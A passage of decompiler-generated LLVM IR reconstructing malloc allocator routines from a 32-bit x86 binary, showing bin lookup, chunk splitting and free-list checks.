  %v10_8049f7f = or i32 %v9_8049f7f, %v6_8049f7f
  store i32 %v10_8049f7f, i32* @ebx, align 4
  br i1 %v4_8049f7f, label %dec_label_pc_804a0c3, label %dec_label_pc_8049f88

dec_label_pc_8049f88:                             ; preds = %dec_label_pc_8049f74
  store i32 ptrtoint (i8* @global_var_8055810.34 to i32), i32* %stack_var_-72, align 4
  %v2_8049f8d = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_8055810.34 to i32*))
  store i32 %v2_8049f8d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a0c3

dec_label_pc_8049f98:                             ; preds = %dec_label_pc_804a0c3, %bb94
  %v0_804a0ce121 = phi i32 [ %v0_804a0ce, %bb94 ], [ %v0_804a0ce118, %dec_label_pc_804a0c3 ]
  store i32 %v0_804a0ce121, i32* %eax.global-to-local, align 4
  %v1_8049f9c = add i32 %v0_804a0ce121, 12
  %v2_8049f9c = inttoptr i32 %v1_8049f9c to i32*
  %v3_8049f9c = load i32, i32* %v2_8049f9c, align 4
  store i32 %v3_8049f9c, i32* %edx.global-to-local, align 4
  %v1_8049f9f = add i32 %v0_804a0ce121, 4
  %v2_8049f9f = inttoptr i32 %v1_8049f9f to i32*
  %v3_8049f9f = load i32, i32* %v2_8049f9f, align 4
  %v1_8049fa2 = and i32 %v3_8049f9f, -4
  store i32 %v1_8049fa2, i32* @esi, align 4
  br i1 %v6_8049f3f, label %dec_label_pc_804a013, label %dec_label_pc_8049faf

dec_label_pc_8049faf:                             ; preds = %dec_label_pc_8049f98
  %v9_8049faf = icmp eq i32 %v3_8049f9c, 134568004
  %v1_8049fb5 = icmp eq i1 %v9_8049faf, false
  br i1 %v1_8049fb5, label %dec_label_pc_804a013, label %dec_label_pc_8049fb7

dec_label_pc_8049fb7:                             ; preds = %dec_label_pc_8049faf
  %v1_8049fb7 = load i32, i32* @global_var_8055840.37, align 64
  %v12_8049fb7 = icmp eq i32 %v0_804a0ce121, %v1_8049fb7
  %v1_8049fbd = icmp eq i1 %v12_8049fb7, false
  br i1 %v1_8049fbd, label %dec_label_pc_804a013, label %dec_label_pc_8049fbf

dec_label_pc_8049fbf:                             ; preds = %dec_label_pc_8049fb7
  %tmp141 = icmp ugt i32 %v1_8049fa2, %v1_804a0c7
  br i1 %tmp141, label %dec_label_pc_8049fc5, label %dec_label_pc_804a013

dec_label_pc_8049fc5:                             ; preds = %dec_label_pc_8049fbf
  %v5_8049fc7 = sub i32 %v1_8049fa2, %v1_804a2f1
  store i32 %v5_8049fc7, i32* %eax.global-to-local, align 4
  %v5_8049fcf = add i32 %v0_804a0ce121, %v1_804a2f1
  store i32 %v5_8049fcf, i32* %edx.global-to-local, align 4
  store i32 %v5_8049fcf, i32* @global_var_805584c.38, align 4
  store i32 %v5_8049fcf, i32* @global_var_8055850.39, align 16
  store i32 %v5_8049fcf, i32* @global_var_8055840.37, align 64
  %v1_8049fe5 = add i32 %v5_8049fcf, 8
  %v2_8049fe5 = inttoptr i32 %v1_8049fe5 to i32*
  store i32 ptrtoint (i32* @global_var_8055844.40 to i32), i32* %v2_8049fe5, align 4
  %v0_8049fec = load i32, i32* %edx.global-to-local, align 4
  %v1_8049fec = add i32 %v0_8049fec, 12
  %v2_8049fec = inttoptr i32 %v1_8049fec to i32*
  store i32 ptrtoint (i32* @global_var_8055844.40 to i32), i32* %v2_8049fec, align 4
  %v4_8049ff3 = or i32 %v1_804a2f1, 1
  store i32 %v0_804a0ce121, i32* @ebx, align 4
  store i32 %v4_8049ff3, i32* %v2_8049f9f, align 4
  %v0_804a003 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a005 = or i32 %v0_804a003, 1
  store i32 %v1_804a005, i32* @ecx, align 4
  %v1_804a008 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a008 = add i32 %v1_804a008, 4
  %v3_804a008 = inttoptr i32 %v2_804a008 to i32*
  store i32 %v1_804a005, i32* %v3_804a008, align 4
  %v0_804a00b = load i32, i32* %eax.global-to-local, align 4
  %v1_804a00b = load i32, i32* %edx.global-to-local, align 4
  %v3_804a00b = add i32 %v1_804a00b, %v0_804a00b
  %v4_804a00b = inttoptr i32 %v3_804a00b to i32*
  store i32 %v0_804a00b, i32* %v4_804a00b, align 4
  br label %dec_label_pc_804a294

dec_label_pc_804a013:                             ; preds = %dec_label_pc_8049fbf, %dec_label_pc_8049fb7, %dec_label_pc_8049faf, %dec_label_pc_8049f98
  store i32 ptrtoint (i32* @global_var_8055844.40 to i32), i32* %eax.global-to-local, align 4
  store i32 %v3_8049f9c, i32* @global_var_8055850.39, align 4
  %v2_804a01b = add i32 %v3_8049f9c, 8
  %v3_804a01b = inttoptr i32 %v2_804a01b to i32*
  store i32 ptrtoint (i32* @global_var_8055844.40 to i32), i32* %v3_804a01b, align 4
  %v0_804a01e = load i32, i32* @esi, align 4
  %v15_804a01e = icmp eq i32 %v0_804a01e, %v1_804a2f1
  %v1_804a022 = icmp eq i1 %v15_804a01e, false
  br i1 %v1_804a022, label %dec_label_pc_804a038, label %dec_label_pc_804a024

dec_label_pc_804a024:                             ; preds = %dec_label_pc_804a013
  store i32 %v0_804a0ce121, i32* %eax.global-to-local, align 4
  store i32 %v1_804a2f1, i32* %edx.global-to-local, align 4
  %v3_804a02c = add i32 %v1_8049f9f, %v1_804a2f1
  %v4_804a02c = inttoptr i32 %v3_804a02c to i32*
  %v5_804a02c = load i32, i32* %v4_804a02c, align 4
  %v6_804a02c = or i32 %v5_804a02c, 1
  store i32 %v6_804a02c, i32* %v4_804a02c, align 4
  %v0_804a031 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_804a031, i32* @ebx, align 4
  br label %dec_label_pc_804a294

dec_label_pc_804a038:                             ; preds = %dec_label_pc_804a013
  %v6_804a03e = icmp ugt i32 %v0_804a01e, 255
  br i1 %v6_804a03e, label %dec_label_pc_804a054, label %dec_label_pc_804a040

dec_label_pc_804a040:                             ; preds = %dec_label_pc_804a038
  %v2_804a042 = udiv i32 %v0_804a01e, 8
  %v1_804a045 = mul nuw i32 %v2_804a042, 8
  %v2_804a045 = add i32 %v1_804a045, 134567996
  store i32 %v2_804a045, i32* %ecx.global-to-local, align 4
  store i32 %v2_804a045, i32* %stack_var_-68, align 4
  %v1_804a04f = add i32 %v1_804a045, 134568004
  %v2_804a04f = inttoptr i32 %v1_804a04f to i32*
  %v3_804a04f = load i32, i32* %v2_804a04f, align 4
  store i32 %v3_804a04f, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804a096

dec_label_pc_804a054:                             ; preds = %dec_label_pc_804a038
  store i32 %v0_804a01e, i32* @eax, align 4
  %v0_804a056 = call i32 @__malloc_largebin_index()
  %v1_804a05d = mul i32 %v0_804a056, 8
  %v2_804a05d = add i32 %v1_804a05d, ptrtoint (i32* @global_var_805583c.36 to i32)
  store i32 %v2_804a05d, i32* %ebx.global-to-local, align 4
  store i32 %v2_804a05d, i32* %stack_var_-68, align 4
  store i32 %v2_804a05d, i32* %eax.global-to-local, align 4
  %v1_804a069 = add i32 %v1_804a05d, add (i32 ptrtoint (i32* @global_var_805583c.36 to i32), i32 8)
  %v2_804a069 = inttoptr i32 %v1_804a069 to i32*
  %v3_804a069 = load i32, i32* %v2_804a069, align 4
  store i32 %v3_804a069, i32* %ebx.global-to-local, align 4
  %v12_804a06c = icmp eq i32 %v3_804a069, %v2_804a05d
  br i1 %v12_804a06c, label %dec_label_pc_804a096, label %dec_label_pc_804a070

dec_label_pc_804a070:                             ; preds = %dec_label_pc_804a054
  store i32 %v2_804a05d, i32* %edx.global-to-local, align 4
  %v1_804a072 = add i32 %v1_804a05d, add (i32 ptrtoint (i32* @global_var_805583c.36 to i32), i32 12)
  %v2_804a072 = inttoptr i32 %v1_804a072 to i32*
  %v3_804a072 = load i32, i32* %v2_804a072, align 4
  store i32 %v3_804a072, i32* %eax.global-to-local, align 4
  %v0_804a075 = load i32, i32* @esi, align 4
  %v2_804a075 = add i32 %v3_804a072, 4
  %v3_804a075 = inttoptr i32 %v2_804a075 to i32*
  %v4_804a075 = load i32, i32* %v3_804a075, align 4
  %v10_804a075 = icmp ult i32 %v0_804a075, %v4_804a075
  %v1_804a078 = icmp eq i1 %v10_804a075, false
  br i1 %v1_804a078, label %dec_label_pc_804a081, label %dec_label_pc_804a07a

dec_label_pc_804a07a:                             ; preds = %dec_label_pc_804a070
  store i32 %v2_804a05d, i32* %ebx.global-to-local, align 4
  store i32 %v3_804a072, i32* %stack_var_-68, align 4
  br label %dec_label_pc_804a096

dec_label_pc_804a081:                             ; preds = %dec_label_pc_804a070
  %v1_804a083 = or i32 %v0_804a075, 1
  store i32 %v1_804a083, i32* %eax.global-to-local, align 4
  %v2_804a08b112 = add i32 %v3_804a069, 4
  %v3_804a08b113 = inttoptr i32 %v2_804a08b112 to i32*
  %v4_804a08b114 = load i32, i32* %v3_804a08b113, align 4
  %v10_804a08b115 = icmp ult i32 %v1_804a083, %v4_804a08b114
  br i1 %v10_804a08b115, label %dec_label_pc_804a088, label %dec_label_pc_804a090

dec_label_pc_804a088:                             ; preds = %dec_label_pc_804a081, %dec_label_pc_804a088
  %v1_804a08b116 = phi i32 [ %v3_804a088, %dec_label_pc_804a088 ], [ %v3_804a069, %dec_label_pc_804a081 ]
  %v1_804a088 = add i32 %v1_804a08b116, 8
  %v2_804a088 = inttoptr i32 %v1_804a088 to i32*
  %v3_804a088 = load i32, i32* %v2_804a088, align 4
  store i32 %v3_804a088, i32* %ebx.global-to-local, align 4
  %v2_804a08b = add i32 %v3_804a088, 4
  %v3_804a08b = inttoptr i32 %v2_804a08b to i32*
  %v4_804a08b = load i32, i32* %v3_804a08b, align 4
  %v10_804a08b = icmp ult i32 %v1_804a083, %v4_804a08b
  br i1 %v10_804a08b, label %dec_label_pc_804a088, label %dec_label_pc_804a090

dec_label_pc_804a090:                             ; preds = %dec_label_pc_804a088, %dec_label_pc_804a081
  %v1_804a08b.lcssa = phi i32 [ %v3_804a069, %dec_label_pc_804a081 ], [ %v3_804a088, %dec_label_pc_804a088 ]
  %v1_804a090 = add i32 %v1_804a08b.lcssa, 12
  %v2_804a090 = inttoptr i32 %v1_804a090 to i32*
  %v3_804a090 = load i32, i32* %v2_804a090, align 4
  store i32 %v3_804a090, i32* %ecx.global-to-local, align 4
  store i32 %v3_804a090, i32* %stack_var_-68, align 4
  br label %dec_label_pc_804a096

dec_label_pc_804a096:                             ; preds = %dec_label_pc_804a054, %dec_label_pc_804a07a, %dec_label_pc_804a040, %dec_label_pc_804a090
  %v0_804a09b = phi i32 [ %v0_804a056, %dec_label_pc_804a054 ], [ %v0_804a056, %dec_label_pc_804a07a ], [ %v2_804a042, %dec_label_pc_804a040 ], [ %v0_804a056, %dec_label_pc_804a090 ]
  %v2_804a098 = sdiv i32 %v0_804a09b, 32
  store i32 %v2_804a098, i32* %edx.global-to-local, align 4
  %v1_804a09b = urem i32 %v0_804a09b, 32
  %v2_804a09b = icmp eq i32 %v1_804a09b, 0
  store i32 1, i32* %eax.global-to-local, align 4
  store i32 %v1_804a09b, i32* @ecx, align 4
  br i1 %v2_804a09b, label %bb94, label %bb

bb:                                               ; preds = %dec_label_pc_804a096
  %v5_804a0a5 = shl i32 1, %v1_804a09b
  store i32 %v5_804a0a5, i32* %eax.global-to-local, align 4
  br label %bb94

bb94:                                             ; preds = %dec_label_pc_804a096, %bb
  %v5_804a0a7 = phi i32 [ 1, %dec_label_pc_804a096 ], [ %v5_804a0a5, %bb ]
  %v1_804a0a7 = mul nsw i32 %v2_804a098, 4
  %v2_804a0a7 = add i32 %v1_804a0a7, ptrtoint (i32* @global_var_8055b44.41 to i32)
  %v3_804a0a7 = inttoptr i32 %v2_804a0a7 to i32*
  %v4_804a0a7 = load i32, i32* %v3_804a0a7, align 4
  %v6_804a0a7 = or i32 %v4_804a0a7, %v5_804a0a7
  store i32 %v6_804a0a7, i32* %v3_804a0a7, align 4
  %v2_804a0ae = load i32, i32* %stack_var_-68, align 4
  store i32 %v2_804a0ae, i32* %edx.global-to-local, align 4
  store i32 %v0_804a0ce121, i32* %eax.global-to-local, align 4
  store i32 %v2_804a0ae, i32* %v2_8049f9c, align 4
  %v0_804a0b8 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804a0b8 = load i32, i32* %eax.global-to-local, align 4
  %v2_804a0b8 = add i32 %v1_804a0b8, 8
  %v3_804a0b8 = inttoptr i32 %v2_804a0b8 to i32*
  store i32 %v0_804a0b8, i32* %v3_804a0b8, align 4
  %v0_804a0bb = load i32, i32* %eax.global-to-local, align 4
  %v1_804a0bb = load i32, i32* %ebx.global-to-local, align 4
  %v2_804a0bb = add i32 %v1_804a0bb, 12
  %v3_804a0bb = inttoptr i32 %v2_804a0bb to i32*
  store i32 %v0_804a0bb, i32* %v3_804a0bb, align 4
  %v0_804a0be = load i32, i32* %eax.global-to-local, align 4
  %v1_804a0be = load i32, i32* %edx.global-to-local, align 4
  %v2_804a0be = add i32 %v1_804a0be, 8
  %v3_804a0be = inttoptr i32 %v2_804a0be to i32*
  store i32 %v0_804a0be, i32* %v3_804a0be, align 4
  %v0_804a0ce = load i32, i32* @global_var_8055850.39, align 16
  %v9_804a0d8 = icmp eq i32 %v0_804a0ce, 134568004
  %v1_804a0de = icmp eq i1 %v9_804a0d8, false
  br i1 %v1_804a0de, label %dec_label_pc_8049f98, label %dec_label_pc_804a0e4

dec_label_pc_804a0c3:                             ; preds = %dec_label_pc_8049f74, %dec_label_pc_8049f41, %dec_label_pc_8049f88
  %v1_804a0c7 = add i32 %v1_804a2f1, 16
  store i32 %v1_804a0c7, i32* @ecx, align 4
  %v0_804a0ce118 = load i32, i32* @global_var_8055850.39, align 16
  %v9_804a0d8119 = icmp eq i32 %v0_804a0ce118, 134568004
  %v1_804a0de120 = icmp eq i1 %v9_804a0d8119, false
  br i1 %v1_804a0de120, label %dec_label_pc_8049f98, label %dec_label_pc_804a0e4

dec_label_pc_804a0e4:                             ; preds = %bb94, %dec_label_pc_804a0c3
  %v0_804a0ce.lcssa = phi i32 [ %v0_804a0ce118, %dec_label_pc_804a0c3 ], [ %v0_804a0ce, %bb94 ]
  %v0_804a17d.pre = load i32, i32* @ebp, align 4
  br i1 %v8_8049f37, label %dec_label_pc_804a17d, label %dec_label_pc_804a0f2

dec_label_pc_804a0f2:                             ; preds = %dec_label_pc_804a0e4
  %v1_804a0f2 = mul i32 %v0_804a17d.pre, 8
  %v2_804a0f2 = add i32 %v1_804a0f2, ptrtoint (i32* @global_var_805583c.36 to i32)
  store i32 %v2_804a0f2, i32* %edx.global-to-local, align 4
  %v1_804a0f9 = add i32 %v1_804a0f2, add (i32 ptrtoint (i32* @global_var_805583c.36 to i32), i32 12)
  %v2_804a0f9 = inttoptr i32 %v1_804a0f9 to i32*
  %storemerge1.pre = load i32, i32* %v2_804a0f9, align 4
  br label %dec_label_pc_804a179

dec_label_pc_804a0fe:                             ; preds = %dec_label_pc_804a179
  %v1_804a0fe = add i32 %v4_804a115, 4
  %v2_804a0fe = inttoptr i32 %v1_804a0fe to i32*
  %v3_804a0fe = load i32, i32* %v2_804a0fe, align 4
  %v1_804a101 = and i32 %v3_804a0fe, -4
  store i32 %v1_804a101, i32* @ebx, align 4
  %v10_804a104 = icmp ult i32 %v1_804a101, %v1_804a2f1
  %v1_804a108 = add i32 %v4_804a115, 12
  %v2_804a108 = inttoptr i32 %v1_804a108 to i32*
  %v3_804a108 = load i32, i32* %v2_804a108, align 4
  store i32 %v3_804a108, i32* @ecx, align 4
  br i1 %v10_804a104, label %dec_label_pc_804a179, label %dec_label_pc_804a10d

dec_label_pc_804a10d:                             ; preds = %dec_label_pc_804a0fe
  %v1_804a10d = add i32 %v4_804a115, 8
  %v2_804a10d = inttoptr i32 %v1_804a10d to i32*
  %v3_804a10d = load i32, i32* %v2_804a10d, align 4
  store i32 %v3_804a10d, i32* @edx, align 4
  %v1_804a110 = add i32 %v3_804a10d, 12
  %v2_804a110 = inttoptr i32 %v1_804a110 to i32*
  %v3_804a110 = load i32, i32* %v2_804a110, align 4
  %v15_804a110 = icmp eq i32 %v3_804a110, %v4_804a115
  %v1_804a113 = icmp eq i1 %v15_804a110, false
  br i1 %v1_804a113, label %dec_label_pc_804a11a, label %dec_label_pc_804a115

dec_label_pc_804a115:                             ; preds = %dec_label_pc_804a10d
  %v1_804a115 = add i32 %v3_804a108, 8
  %v2_804a115 = inttoptr i32 %v1_804a115 to i32*
  %v3_804a115 = load i32, i32* %v2_804a115, align 4
  %v15_804a115 = icmp eq i32 %v3_804a115, %v4_804a115
  br i1 %v15_804a115, label %dec_label_pc_804a11f, label %dec_label_pc_804a11a

dec_label_pc_804a11a:                             ; preds = %dec_label_pc_804a115, %dec_label_pc_804a10d
  %v0_804a11a = call i32 @abort()
  store i32 %v0_804a11a, i32* %eax.global-to-local, align 4
  %v0_804a11f.pre = load i32, i32* @ebx, align 4
  %v0_804a125.pre = load i32, i32* @ecx, align 4
  %v1_804a125.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804a11f

dec_label_pc_804a11f:                             ; preds = %dec_label_pc_804a115, %dec_label_pc_804a11a
  %v1_804a125 = phi i32 [ %v3_804a10d, %dec_label_pc_804a115 ], [ %v1_804a125.pre, %dec_label_pc_804a11a ]
  %v0_804a125 = phi i32 [ %v3_804a108, %dec_label_pc_804a115 ], [ %v0_804a125.pre, %dec_label_pc_804a11a ]
  %v0_804a11f = phi i32 [ %v1_804a101, %dec_label_pc_804a115 ], [ %v0_804a11f.pre, %dec_label_pc_804a11a ]
  %v5_804a121 = sub i32 %v0_804a11f, %v1_804a2f1
  store i32 %v5_804a121, i32* %esi.global-to-local, align 4
  %v2_804a125 = add i32 %v1_804a125, 12
  %v3_804a125 = inttoptr i32 %v2_804a125 to i32*
  store i32 %v0_804a125, i32* %v3_804a125, align 4
  %v0_804a128 = load i32, i32* @edx, align 4
  %v1_804a128 = load i32, i32* @ecx, align 4
  %v2_804a128 = add i32 %v1_804a128, 8
  %v3_804a128 = inttoptr i32 %v2_804a128 to i32*
  store i32 %v0_804a128, i32* %v3_804a128, align 4
  %v0_804a12b = load i32, i32* %esi.global-to-local, align 4
  %v0_804a12e = load i32, i32* %eax.global-to-local, align 4
  %v1_804a12e = add i32 %v0_804a12e, 8
  store i32 %v1_804a12e, i32* @ecx, align 4
  %v6_804a131 = icmp ugt i32 %v0_804a12b, 15
  br i1 %v6_804a131, label %dec_label_pc_804a13a, label %dec_label_pc_804a133

dec_label_pc_804a133:                             ; preds = %dec_label_pc_804a11f
  %v0_804a133 = load i32, i32* @ebx, align 4
  %v2_804a133 = add i32 %v0_804a12e, 4
  %v3_804a133 = add i32 %v2_804a133, %v0_804a133
  %v4_804a133 = inttoptr i32 %v3_804a133 to i32*
  %v5_804a133 = load i32, i32* %v4_804a133, align 4
  %v6_804a133 = or i32 %v5_804a133, 1
  store i32 %v6_804a133, i32* %v4_804a133, align 4
  br label %dec_label_pc_804a170

dec_label_pc_804a13a:                             ; preds = %dec_label_pc_804a11f
  %v2_804a13e = add i32 %v0_804a12e, %v1_804a2f1
  store i32 %v2_804a13e, i32* %edx.global-to-local, align 4
  store i32 %v0_804a0ce.lcssa, i32* %ebx.global-to-local, align 4
  %v2_804a145 = add i32 %v0_804a0ce.lcssa, 8
  %v3_804a145 = inttoptr i32 %v2_804a145 to i32*
  store i32 %v2_804a13e, i32* %v3_804a145, align 4
  %v0_804a148 = load i32, i32* %edx.global-to-local, align 4
  %v1_804a148 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804a148 = add i32 %v1_804a148, 12
  %v3_804a148 = inttoptr i32 %v2_804a148 to i32*
  store i32 %v0_804a148, i32* %v3_804a148, align 4
  %v0_804a14b = load i32, i32* %edx.global-to-local, align 4
  %v1_804a14b = add i32 %v0_804a14b, 8
  %v2_804a14b = inttoptr i32 %v1_804a14b to i32*
  store i32 ptrtoint (i32* @global_var_8055844.40 to i32), i32* %v2_804a14b, align 4
  %v0_804a152 = load i32, i32* %edx.global-to-local, align 4
  %v1_804a152 = add i32 %v0_804a152, 12
  %v2_804a152 = inttoptr i32 %v1_804a152 to i32*
  store i32 ptrtoint (i32* @global_var_8055844.40 to i32), i32* %v2_804a152, align 4
  %v4_804a159 = or i32 %v1_804a2f1, 1
  store i32 %v4_804a159, i32* %ebx.global-to-local, align 4
  %v1_804a162 = load i32, i32* %eax.global-to-local, align 4
  %v2_804a162 = add i32 %v1_804a162, 4
  %v3_804a162 = inttoptr i32 %v2_804a162 to i32*
  store i32 %v4_804a159, i32* %v3_804a162, align 4
  %v0_804a165 = load i32, i32* %esi.global-to-local, align 4
  %v1_804a167 = or i32 %v0_804a165, 1
  store i32 %v1_804a167, i32* %eax.global-to-local, align 4
  %v1_804a16a = load i32, i32* %edx.global-to-local, align 4
  %v2_804a16a = add i32 %v1_804a16a, 4
  %v3_804a16a = inttoptr i32 %v2_804a16a to i32*
  store i32 %v1_804a167, i32* %v3_804a16a, align 4
  %v0_804a16d = load i32, i32* %esi.global-to-local, align 4
  %v1_804a16d = load i32, i32* %edx.global-to-local, align 4
  %v3_804a16d = add i32 %v1_804a16d, %v0_804a16d
  %v4_804a16d = inttoptr i32 %v3_804a16d to i32*
  store i32 %v0_804a16d, i32* %v4_804a16d, align 4
  br label %dec_label_pc_804a170

dec_label_pc_804a170:                             ; preds = %dec_label_pc_804a133, %dec_label_pc_804a13a
  %v0_804a170 = load i32, i32* @ecx, align 4
  store i32 %v0_804a170, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804a604

dec_label_pc_804a179:                             ; preds = %dec_label_pc_804a0fe, %dec_label_pc_804a0f2
  %v4_804a115 = phi i32 [ %storemerge1.pre, %dec_label_pc_804a0f2 ], [ %v3_804a108, %dec_label_pc_804a0fe ]
  store i32 %v4_804a115, i32* %eax.global-to-local, align 4
  %v12_804a179 = icmp eq i32 %v4_804a115, %v2_804a0f2
  %v1_804a17b = icmp eq i1 %v12_804a179, false
  br i1 %v1_804a17b, label %dec_label_pc_804a0fe, label %dec_label_pc_804a17d.loopexit

dec_label_pc_804a17d.loopexit:                    ; preds = %dec_label_pc_804a179
  br label %dec_label_pc_804a17d

dec_label_pc_804a17d:                             ; preds = %dec_label_pc_804a0e4, %dec_label_pc_804a17d.loopexit
  %v1_804a17d = add i32 %v0_804a17d.pre, 1
  store i32 %v1_804a17d, i32* %ecx.global-to-local, align 4
  %v1_804a180 = mul i32 %v1_804a17d, 8
  %v2_804a180 = add i32 %v1_804a180, ptrtoint (i32* @global_var_805583c.36 to i32)
  store i32 %v2_804a180, i32* %ebx.global-to-local, align 4
  %v2_804a189 = udiv i32 %v1_804a17d, 32
  store i32 %v2_804a189, i32* @ebp, align 4
  %v1_804a18c = mul nuw nsw i32 %v2_804a189, 4
  %v2_804a18c = add i32 %v1_804a18c, ptrtoint (i32* @global_var_8055b44.41 to i32)
  %v3_804a18c = inttoptr i32 %v2_804a18c to i32*
  %v4_804a18c = load i32, i32* %v3_804a18c, align 4
  store i32 %v4_804a18c, i32* @esi, align 4
  %v1_804a193 = urem i32 %v1_804a17d, 32
  %v2_804a193 = icmp eq i32 %v1_804a193, 0
  store i32 %v1_804a193, i32* %ecx.global-to-local, align 4
  store i32 1, i32* @edi, align 4
  br i1 %v2_804a193, label %.preheader, label %bb95

bb95:                                             ; preds = %dec_label_pc_804a17d
  %v5_804a19b = shl i32 1, %v1_804a193
  store i32 %v5_804a19b, i32* @edi, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_804a17d, %bb95, %dec_label_pc_804a1dc
  %v0_804a1cc1764 = phi i32 [ %v1_804a1e9, %dec_label_pc_804a1dc ], [ %v2_804a180, %bb95 ], [ %v2_804a180, %dec_label_pc_804a17d ]
  %v1_804a19d = phi i32 [ %v1_804a19d.pre, %dec_label_pc_804a1dc ], [ %v4_804a18c, %bb95 ], [ %v4_804a18c, %dec_label_pc_804a17d ]
  %v0_804a1a1 = phi i32 [ %v2_804a1ec, %dec_label_pc_804a1dc ], [ %v5_804a19b, %bb95 ], [ 1, %dec_label_pc_804a17d ]
  %tmp96 = icmp ule i32 %v0_804a1a1, %v1_804a19d
  %v1_804a1a1 = icmp eq i32 %v0_804a1a1, 0
  %v1_804a1a3 = icmp eq i1 %v1_804a1a1, false
  %or.cond = and i1 %tmp96, %v1_804a1a3
  br i1 %or.cond, label %dec_label_pc_804a1d1.preheader, label %dec_label_pc_804a1a5.preheader

dec_label_pc_804a1a5.preheader:                   ; preds = %.preheader
  %v0_804a1a5.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_804a1a5

dec_label_pc_804a1a5:                             ; preds = %dec_label_pc_804a1a5.preheader, %dec_label_pc_804a1af
  %v0_804a1a5 = phi i32 [ %v0_804a1a5.pre, %dec_label_pc_804a1a5.preheader ], [ %v1_804a1a5, %dec_label_pc_804a1af ]
  %v1_804a1a5 = add i32 %v0_804a1a5, 1
  store i32 %v1_804a1a5, i32* @ebp, align 4
  %v6_804a1a9 = icmp ugt i32 %v1_804a1a5, 2
  br i1 %v6_804a1a9, label %dec_label_pc_804a25c.loopexit, label %dec_label_pc_804a1af

dec_label_pc_804a1af:                             ; preds = %dec_label_pc_804a1a5
  %v1_804a1af = mul i32 %v1_804a1a5, 4
  %v2_804a1af = add i32 %v1_804a1af, ptrtoint (i32* @global_var_8055b44.41 to i32)
  %v3_804a1af = inttoptr i32 %v2_804a1af to i32*
  %v4_804a1af = load i32, i32* %v3_804a1af, align 4
  store i32 %v4_804a1af, i32* @esi, align 4
  %v1_804a1b6 = icmp eq i32 %v4_804a1af, 0
  br i1 %v1_804a1b6, label %dec_label_pc_804a1a5, label %dec_label_pc_804a1ba

dec_label_pc_804a1ba:                             ; preds = %dec_label_pc_804a1af
  %v2_804a1bc = mul i32 %v1_804a1a5, 256
  store i32 %v2_804a1bc, i32* %eax.global-to-local, align 4
  %v1_804a1bf = add i32 %v2_804a1bc, ptrtoint (i32* @global_var_805583c.36 to i32)
  store i32 %v1_804a1bf, i32* %ebx.global-to-local, align 4
  store i32 1, i32* @edi, align 4
  br label %dec_label_pc_804a1d1.preheader

dec_label_pc_804a1d1.preheader:                   ; preds = %.preheader, %dec_label_pc_804a1ba
  %v0_804a1cc17 = phi i32 [ %v1_804a1bf, %dec_label_pc_804a1ba ], [ %v0_804a1cc1764, %.preheader ]
  %edi.promoted = phi i32 [ 1, %dec_label_pc_804a1ba ], [ %v0_804a1a1, %.preheader ]
  %v0_804a1e0 = phi i32 [ %v4_804a1af, %dec_label_pc_804a1ba ], [ %v1_804a19d, %.preheader ]
  %v2_804a1d19 = and i32 %v0_804a1e0, %edi.promoted
  %v3_804a1d110 = icmp eq i32 %v2_804a1d19, 0
  br i1 %v3_804a1d110, label %dec_label_pc_804a1cc, label %dec_label_pc_804a1d5

dec_label_pc_804a1cc:                             ; preds = %dec_label_pc_804a1d1.preheader, %dec_label_pc_804a1cc
  %v2_804a1cf19 = phi i32 [ %v2_804a1cf, %dec_label_pc_804a1cc ], [ %edi.promoted, %dec_label_pc_804a1d1.preheader ]
  %v0_804a1cc18 = phi i32 [ %v1_804a1cc, %dec_label_pc_804a1cc ], [ %v0_804a1cc17, %dec_label_pc_804a1d1.preheader ]
  %v1_804a1cc = add i32 %v0_804a1cc18, 8
  %v2_804a1cf = mul i32 %v2_804a1cf19, 2
  %v2_804a1d1 = and i32 %v2_804a1cf, %v0_804a1e0
  %v3_804a1d1 = icmp eq i32 %v2_804a1d1, 0
  br i1 %v3_804a1d1, label %dec_label_pc_804a1cc, label %dec_label_pc_804a1d1.dec_label_pc_804a1d5_crit_edge

dec_label_pc_804a1d1.dec_label_pc_804a1d5_crit_edge: ; preds = %dec_label_pc_804a1cc
  store i32 %v1_804a1cc, i32* %ebx.global-to-local, align 4
  store i32 %v2_804a1cf, i32* @edi, align 4
  br label %dec_label_pc_804a1d5

dec_label_pc_804a1d5:                             ; preds = %dec_label_pc_804a1d1.dec_label_pc_804a1d5_crit_edge, %dec_label_pc_804a1d1.preheader
  %v0_804a1dc = phi i32 [ %v2_804a1cf, %dec_label_pc_804a1d1.dec_label_pc_804a1d5_crit_edge ], [ %edi.promoted, %dec_label_pc_804a1d1.preheader ]
  %v1_804a1ff = phi i32 [ %v1_804a1cc, %dec_label_pc_804a1d1.dec_label_pc_804a1d5_crit_edge ], [ %v0_804a1cc17, %dec_label_pc_804a1d1.preheader ]
  %v1_804a1d5 = add i32 %v1_804a1ff, 12
  %v2_804a1d5 = inttoptr i32 %v1_804a1d5 to i32*
  %v3_804a1d5 = load i32, i32* %v2_804a1d5, align 4
  store i32 %v3_804a1d5, i32* %edx.global-to-local, align 4
  %v12_804a1d8 = icmp eq i32 %v3_804a1d5, %v1_804a1ff
  %v1_804a1da = icmp eq i1 %v12_804a1d8, false
  br i1 %v1_804a1da, label %dec_label_pc_804a1f0, label %dec_label_pc_804a1dc

dec_label_pc_804a1dc:                             ; preds = %dec_label_pc_804a1d5
  %v1_804a1de = sub i32 -1, %v0_804a1dc
  store i32 %v1_804a1de, i32* %eax.global-to-local, align 4
  %v2_804a1e0 = and i32 %v0_804a1e0, %v1_804a1de
  store i32 %v2_804a1e0, i32* @esi, align 4
  %v1_804a1e2 = load i32, i32* @ebp, align 4
  %v2_804a1e2 = mul i32 %v1_804a1e2, 4
  %v3_804a1e2 = add i32 %v2_804a1e2, ptrtoint (i32* @global_var_8055b44.41 to i32)
  %v4_804a1e2 = inttoptr i32 %v3_804a1e2 to i32*
  store i32 %v2_804a1e0, i32* %v4_804a1e2, align 4
  %v0_804a1e9 = load i32, i32* %edx.global-to-local, align 4
